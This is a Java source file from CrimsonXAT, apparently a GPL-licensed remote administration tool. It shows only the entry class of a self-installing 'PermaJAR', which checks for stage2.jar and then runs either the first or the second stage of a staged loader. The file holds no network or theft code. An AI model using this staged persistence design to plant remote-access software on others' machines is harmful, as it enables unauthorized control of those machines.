/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage1;

import java.io.File;

import subterranean.crimson.permajar.stage2.Stage2;



/**
 *
 * Main class for a multi-platform PermaJAR (Jar that is installed on the system)
 *
 */

public class PermaJar {

	public static void main(String[] args) {
		if (isStage2()) {
			Stage1.loadStage2();
			Stage2.run(new String[]{"initial"});
		} else {
			Stage1.run(args);
		}

	}

	public static boolean isStage2() {
		return (new File("stage2.jar")).exists();
	}

}
